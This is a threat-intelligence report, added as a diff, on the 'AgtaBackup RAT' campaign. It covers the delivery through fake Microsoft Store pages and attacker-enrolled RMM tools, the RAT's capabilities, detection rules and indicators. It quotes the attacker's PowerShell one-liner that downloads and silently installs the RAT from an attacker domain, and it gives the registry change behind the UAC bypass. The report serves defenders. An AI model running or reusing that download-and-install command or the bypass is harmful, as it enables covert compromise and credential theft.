@@ -1,0 +1,318 @@
+2026-09-28 (Monday): AgtaBackup RAT Campaign
+
+AUTHOR:
+
+- Ofek Lahiani
+
+CAMPAIGN NOTES:
+
+- We have identified a previously-undocumented multi-stage campaign delivering a custom .NET remote access trojan we've named "AgtaBackup RAT" 
+  -- This name is based on artifacts embedded in the malware:
+      --- Service name: AgtaBackupAgentSvc
+      --- Install directory: C:\Program Files\Agta Backup
+      --- MSI installer: AgtaBackupAgent.msi
+- This campaign begins with a landing page impersonating a popular video conferencing software.
+   -- The page impersonates a Microsoft Store product listing.
+   -- The page delivers a genuinely-signed remote monitoring and management (RMM) MSI installer.
+      --- These include LogMeIn Resolve, ConnectWise ScreenConnect, or similar.
+   -- During the installation, the user consents to a UAC elevation prompt.
+      --- The RMM package is then enrolled to an attacker-controlled RMM tenant.
+      --- This grants the attacker silent remote-control access to the victim's host.
+- The attacker uses the RMM to open a remote terminal on the victim's host.
+- The attacker then pastes a PowerShell one-liner tho download the AgtaBackup RAT installer.
+- The AgtaBackup RAT is hosted on attacker-controlled infrastructure and silent-installs it as a hidden SYSTEM Windows service.
+
+AGTABACKUP RAT OVERVIEW:
+
+- AgtaBackup RAT is a fully-featured .NET 8.0 single-file bundle apphost with:
+  -- A 10-mode operational dispatcher
+  -- 22 internal REST API endpoints
+  -- Dual-channel C2 (HTTP check-in every 2 seconds + WebSocket relay with 25-second ping)
+  -- Permanent HTTP fallback on TCP port 4080.
+- Post-compromise capabilities include:
+  -- Browser credential and cookie harvesting across nine browser families:
+     --- Chrome, Edge, Brave, Opera, Opera GX, Vivaldi, Chromium, Yandex, Firefox
+  -- Keystroke logging via a separate binary named "Window Security Health Services.exe"
+  -- PrintWindow-based screenshot capture
+  -- Hidden interactive desktop shell (AgtaBackstage)
+  -- UAC secure-desktop bypass via named-pipe input injection
+  -- Arbitrary file transfer and PowerShell execution
+- Persistence is enforced through two SYSTEM scheduled tasks:
+  -- The tasks are named "AgtaBackupAgentWatchdog" and "AgtaBackupAgentGuardian"
+  -- The tasks use 1-minute repetition and boot triggers
+  -- The tasks re-install the RAT within 60 seconds if the service is stopped or the install directory is removed. 
+- The service applies a restrictive SDDL to hide itself from non-SYSTEM users, including local administrators.
+
+ATTACK FLOW:
+
+Stage 1 — Delivery: 
+
+- The user is directed to a page impersonating a popular videoconferencing software.
+   -- This page impersonates a  Microsoft Store product listing for the software.
+
+Stage 2 — Initial access: 
+
+- The landing page delivers a legitimately-signed RMM MSI installer for an RMM product 
+   -- Such as LogMeIn Resolve Unattended, ConnectWise ScreenConnect, or similar
+   -- The MSI enrolls the endpoint into an attacker-controlled RMM tenant. 
+   -- The user is presented with a full MSI install dialog and a Windows UAC elevation prompt
+   -- On consent, the RMM service is registered as SYSTEM and calls out to the vendor's legitimate cloud endpoints
+   -- This information appears in the attacker's RMM service console.
+
+Stage 3 — Hands-on-keyboard:
+
+- Happens after a variable delay (hours to days)
+- The attacker opens an interactive remote terminal via the enrolled RMM console.
+  -- The attacker and pastes a PowerShell one-liner in the pattern: 
+     Invoke-WebRequest -Uri "hxxps[:]//<attacker-domain>/AgtaBackupAgent.msi" -OutFile
+     "$env:TEMP\AgtaBackupAgent.msi"; msiexec /i "$env:TEMP\AgtaBackupAgent.msi" /qn 
+     /l*v "$env:TEMP\agta-install.log"
+
+Stage 4 — RAT install: 
+
+- The msiexec /qn silent install:
+  -- Drops the RAT to C:\Program Files\Agta Backup\Credential Guard.exe (marked Hidden + System)
+  -- Invokes the binary in --install-service mode
+  -- Registers Windows service AgtaBackupAgentSvc as LocalSystem with 5-second restart-on-failure
+  -- Writes the C2 URL to machine environment variable AGENT_CHECKIN_URL and the enrollment secret to AGENT_CHECKIN_SECRET and secret.txt
+  -- Applies the "hide from non-SYSTEM users" SDDL to the service
+  -- Creates two SYSTEM scheduled tasks (AgtaBackupAgentWatchdog, AgtaBackupAgentGuardian) running every 60 seconds with a boot trigger.
+
+Stage 5 — C2 handshake: 
+
+- The service begins polling the C2 endpoint /api/agents/checkin every 2 seconds
+  -- Submits a full inventory (agent ID, hostname, OS, IP, active user, idle time, installed AV product enumerated via PowerShell WMI query against root\SecurityCenter2) every 30 seconds. 
+  -- A WebSocket relay to /ws/agent?id={id}&secret={secret} is opened for real-time bidirectional command delivery. 
+  -- All C2 requests carry an X-Agent-Secret HTTP header (default: agta-enroll-7f3a1c2d9e).
+
+Stage 6 — Post-compromise operations:
+
+- The RAT launches five concurrent subsystems
+  -- HTTP check-in client
+  -- WebSocket relay link,
+  -- Install-queue processor,
+  -- Self-heal backstop thread
+  -- Keylogger keep-alive manager
+- The browser credential harvester runs 2 minutes after start and then every 5 hours
+- It targets nine browser families and uploading the harvested data to /api/agents/browser-profile as a ZIP archive. 
+- The keylogger binary (Window Security Health Services.exe) is launched in the active user session. 
+- The UAC helper listens on named pipe \\.\pipe\agta-uac-AgtaBackupAgentSvc 
+- The UAC Helper sets HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop = 0 to move UAC prompts off the secure desktop so the attacker can inject keystrokes remotely. 
+- The hidden AgtaBackstage desktop hosts an interactive conhost.exe powershell.exe or conhost.exe cmd.exe session invisible to the logged-in user.
+
+MALWARE ANALYSIS — AgtaBackup RAT (Credential Guard.exe):
+
+- The binary is a 64-bit Windows PE, a .NET 8.0 single-file bundle apphost built on CoreCLR 8.0.29. 
+- The bundle embeds 60 managed assemblies, including the primary payload Credential Guard.dll (version 1.7.77) and support library AgtaCore.dll (version 1.0.0).
+- PE version resources masquerade as Windows Credential Guard: 
+  -- The company name, product name, and file description are all set to "Credential Guard" with version 1.7.77.0. 
+- Subsidiary engine executables imitate Dell components (Dell.sub.Agent.exe, Dell Window Guard.exe, Dell.Virus.Guard.exe) and Windows Security (Window Security Health Services.exe).
+- The managed entry point dispatches to one of ten operational modes based on the first CLI argument:
+  --service
+  --install-service
+  --uninstall-service
+  --watchdog
+  --guardian
+  --idle-probe
+  --uac-helper
+  --relay-test
+  --bs-selftest
+  --print-config.
+- The command executor handles seven C2-delivered command types:
+  -- script (arbitrary PowerShell -NoProfile -NonInteractive -ExecutionPolicy Bypass)
+  -- shutdown
+  -- restart
+  -- logoff
+  -- screenshot (launches the stream engine in the active user session)
+  -- installStaged (downloads an MSI or EXE from /api/agents/install-stage/{id} and executes silently)
+  -- agentApi (dispatches to a 22-endpoint internal REST API).
+- The 22 internal API endpoints include
+  -- /api/device (WMI hardware/OS inventory)
+  -- /api/processes
+  -- /api/services
+  -- /api/apps (registry uninstall paths)
+  -- /api/exec (arbitrary PowerShell)
+  -- /api/files (directory listing)
+  -- /api/download (file read up to 24 MB base64)
+  -- /api/upload (arbitrary file write)
+  -- /api/keylog/{start,stop,clear} + /api/keylog (retrieve keystrokes)
+  -- /api/process/kill
+  -- /api/service/action
+  -- /api/browser/* (hidden browser control)
+  -- /api/backstage/* (hidden desktop session management).
+- Browser credential harvester enumerates:
+  -- Chrome
+  -- Edge
+  -- Brave
+  -- Opera
+  -- Opera GX
+  -- Vivaldi
+  -- Chromium
+  -- Yandex
+  -- and Firefox
+  -- plus dynamic discovery of additional Chromium-based browsers by scanning AppData\Local\* for Local State files. 
+- Copies:
+  -- Login Data
+  -- Login Data For Account
+  -- Cookies
+  -- Web Data
+  -- History
+  -- Bookmarks
+  -- Local State
+  -- Preferences
+  -- Secure Preferences
+  -- network state files for Chromium browsers; cookies.sqlite
+  -- logins.json
+  -- key4.db
+  -- places.sqlite
+  -- formhistory.sqlite
+  -- prefs.js for Firefox. 
+- Public IP lookup via api.ipify[.]org, checkip.amazonaws[.]com, or ifconfig[.]me/ip.
+- Compressed ZIP posted to /api/agents/browser-profile.
+- Keylogger binary (Window Security Health Services.exe) runs in the active user session, recording keystrokes with per-process, per-window, and per-URL context.
+- Service maintains a keep-alive loop that relaunches the keylogger on termination and kills stray non-matching instances.
+- Hidden desktop feature calls CreateDesktopW
+ -- This is done to create a Windows desktop named "AgtaBackstage" 
+ -- The process is invisible to the logged-in user
+ -- Launches conhost.exe powershell.exe -NoLogo or conhost.exe cmd.exe on that desktop
+ -- Output captured via PrintWindow for remote viewing.
+- UAC secure-desktop bypass: 
+ -- UAC helper listens on named pipe agta-uac-{serviceName} with global mutex Global\agta-uac-mtx-{serviceName}
+ -- Injects keystrokes/mouse via SendInput to interact with UAC prompts on the user desktop
+ -- Sets HKLM\...\PromptOnSecureDesktop = 0 to move UAC prompts off the secure desktop
+- Persistence: 
+ -- Watchdog and Guardian scheduled tasks run every minute as SYSTEM
+ -- Checksg service state and re-installing/re-starting the service if stopped or missing. 
+ -- Watchdog sweeps the install directory to remove any file not on a whitelist, like:
+    --- Credential Guard.exe
+    --- Dell.sub.Agent.exe
+    --- Dell Window Guard.exe
+    --- Dell.Virus.Guard.exe
+    --- Window Security Health Services.exe
+ -- Performs auto-updates by checking /AgtaBackupAgent.version and downloading /AgtaBackupAgent.msi when a newer version is available.
+- Dynamic evasion: 
+  -- The C2 server response can push new filenames for the stream/terminal/backstage/keylogger engine executables.
+  -- This is done via the engineNamesRev field on each check-in
+  -- This allowing runtime rename of engine binaries to defeat static filename-based detection. 
+  -- The C2 endpoint failover system maintains both the primary configured URL and a permanent HTTP fallback on port 4080.
+
+DETECTION OPPORTUNITIES:
+
+- powershell.exe or pwsh.exe executing Invoke-WebRequest / DownloadFile targeting a .msi URL and immediately followed by msiexec.exe /i with /qn or /quiet — particularly when the causality actor is a legitimate RMM binary.
+- sc.exe sdset command line matching the SDDL string O:SYG:SYD:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) — this is deterministic and any hit is very high confidence.
+- svchost.exe -k netsvcs -p -s Schedule spawning an unsigned executable (action_process_signature_status != SIGNATURE_SIGNED) at high integrity level.
+- Unsigned SYSTEM-context process reading Chromium credential-store files (Login Data, Cookies, Web Data, Local State) or Firefox files (key4.db, logins.json, cookies.sqlite) — particularly when the actor is not the browser process itself and reads three or more distinct browser-profile files within 60 seconds.
+- Registry SET_VALUE on HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop = 0 by an unsigned process or by a scripted process (powershell.exe, cmd.exe, reg.exe, rundll32.exe).
+- Named-pipe creation matching \\.\pipe\agta-uac-* by an unsigned process, or global mutex creation matching Global\agta-uac-mtx-*.
+- Machine-scope environment variable creation for AGENT_CHECKIN_URL and AGENT_CHECKIN_SECRET (registry SET_VALUE under HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment).
+- HTTP request patterns to /api/agents/checkin, /api/agents/result, /api/agents/browser-profile, /api/agents/install-stage/, /ws/agent?id=, /AgtaBackupAgent.version, or /AgtaBackupAgent.msi carrying the X-Agent-Secret HTTP header.
+- HTTP responses from any external destination with a page title matching a case-insensitive regex for "agta backup" on TCP/4080.
+
+INDICATORS:
+
+AGTABACKUP RAT C2 DOMAINS:
+
+- avanade[.]cc
+- backupplanetwealthagta[.]top
+- beehstwithust[.]org
+- blessingsbe[.]top
+- bootbackup[.]com
+- bootprivate[.]com
+- cashyejrudga[.]live
+- childofwhho[.]top
+- connectprivae[.]top
+- criopifileeworking[.]top
+- datavaseffhjurd[.]top
+- electomm[.]sbs
+- emef[.]info
+- emsafetoproceedtaward[.]top
+- evobasin[.]info
+- ghxstworkingagent[.]top
+- greateshystfqsh[.]one
+- gsop[.]top
+- hr4hire[.]top
+- installapp[.]cc
+- jokermav[.]online
+- kresyuhjance[.]help
+- llgoldassociates[.]com
+- magicislanding[.]lol
+- outfitstryon[.]info
+- palnetworkingleup[.]top
+- piejaholoop[.]org
+- planetbizzingupcleananddirt[.]top
+- planetvocalfortesttheteas[.]cyou
+- planetvocalfortheteas[.]cyou
+- planetwealthonlycleancoffe[.]top
+- planetwealthonlycleantea[.]top
+- planetworkingclassrewor[.]top
+- planetworkingfortwo[.]top
+- planetwrokingclassforagemt[.]top
+- plnetcorresnifagenttea[.]top
+- qualityfilesghost[.]live
+- redjohntiger[.]top
+- rizkidworikingjuice[.]top
+- runtownagtabackup[.]top
+- selfpnl001[.]com
+- sunbeitnetwork[.]com
+- unrealjustcoffe[.]top
+- unrelioaworkinghun[.]top
+
+DOMAINS IMPERSONATING VENDORS:
+
+- acrobat-reader-installer[.]com
+- 03webzoominvite[.]us
+
+
+URL PATHS (relative to C2 host):
+
+- /AgtaBackupAgent.version (RAT self-update version check)
+- /AgtaBackupAgent.msi (RAT self-update installer)
+- /api/agents/browser-profile (browser-store exfil upload)
+- /api/agents/checkin (2-second RAT check-in poll)
+- /api/agents/install-stage/{id} (staged installer download)
+- /api/agents/result (command result posting)
+- /ws/agent?id={agentId}&secret={secret} (WebSocket relay, 25-s ping)
+
+HTTP HEADER LINE:
+
+- X-Agent-Secret: agta-enroll-7f3a1c2d9e (default hardcoded enrollment secret)
+
+SHA-256 HASHES:
+
+- 10e0a4861b94b72dd802d0a59f2eac7f8df63f497460aa5252560951fe7b8614 (related Windows Installer artifact)
+- 2be4a7b66f6e2fc6759451861ca36589ab6d41566c33226dcac80da15862299d (related CAB artifact)
+- 5c3267a7855efc96c1144cbfcee937527979d4747c7645b2d36958d43ef3d51f (Adobe Reader.msi — related malicious MSI)
+- a30e8229085407db5ddfe58d33cd7dc4d70fdd0eec29ae0714d77762bbf61393 (AgtaBackupAgent.msi — RAT installer)
+- c9394752d42fe7b70aa65d91802d4d2a0365c885f27db07460f724395f53ab70 (Credential Guard.exe — AgtaBackup RAT primary binary)
+- cfdd8d82fa71383c9ed92d1c21dd64b0eda3d8bb622d71be7205802269fe8e58 (ZoomInstaller.msi — related malicious MSI)
+
+FILE PATHS:
+
+- C:\Program Files\Agta Backup\ (RAT install directory; Hidden + System attributes)
+- C:\Program Files\Agta CS Test\ (test-build install directory)
+- C:\ProgramData\Agta Backup\ (RAT data directory; contains agent_identity.json, secret.txt, server.txt, idle.probe)
+- C:\ProgramData\Agta CS Test\ (test-build data directory)
+- C:\Windows\SystemTemp\agta_av_*.ps1 (AV enumeration PowerShell scripts querying root\SecurityCenter2)
+- C:\Windows\SystemTemp\agta_task_*.xml (scheduled-task definition XMLs)
+- C:\Windows\Temp\agta-install.log (msiexec install log)
+- C:\Windows\Temp\AgtaBackupAgent.msi (RAT installer staging path)
+FILENAMES:
+
+- AgtaBackupAgent.msi (RAT installer)
+- Credential Guard.exe (RAT primary binary; masquerades as Windows Credential Guard)
+- Dell Window Guard.exe (terminal engine; masquerades as Dell component)
+- Dell.sub.Agent.exe (stream/screen-sharing engine; masquerades as Dell component)
+- Dell.Virus.Guard.exe (backstage/hidden-desktop engine; masquerades as Dell component)
+- Window Security Health Services.exe (keylogger; masquerades as Windows Security Health Service)
+
+WINDOWS ARTIFACTS:
+
+- Agent device-ID format: dev_<16 random hex characters>
+- Global mutex: Global\agta-uac-mtx-AgtaBackupAgentSvc (UAC helper single-instance)
+- Hidden Windows desktop: AgtaBackstage (created via CreateDesktopW; hosts attacker's interactive cmd.exe / powershell.exe)
+- Machine environment variables: AGENT_CHECKIN_URL (holds C2 URL), AGENT_CHECKIN_SECRET (holds enrollment secret)
+- Named pipe: \\.\pipe\agta-uac-AgtaBackupAgentSvc (UAC helper IPC)
+- Registry value: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop = 0 (UAC secure-desktop bypass)
+- Scheduled tasks: AgtaBackupAgentWatchdog, AgtaBackupAgentGuardian (production) or AgtaCsTestWatchdog, AgtaCsTestGuardian (test)
+- Service name: AgtaBackupAgentSvc (production) or AgtaCsTestSvc (test); display name "Agta Backup Agent"
+- Service SDDL (hides service from non-SYSTEM users): O:SYG:SYD:(A;;CCLCSWRPWPDTLOCRSDRCWDWO;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
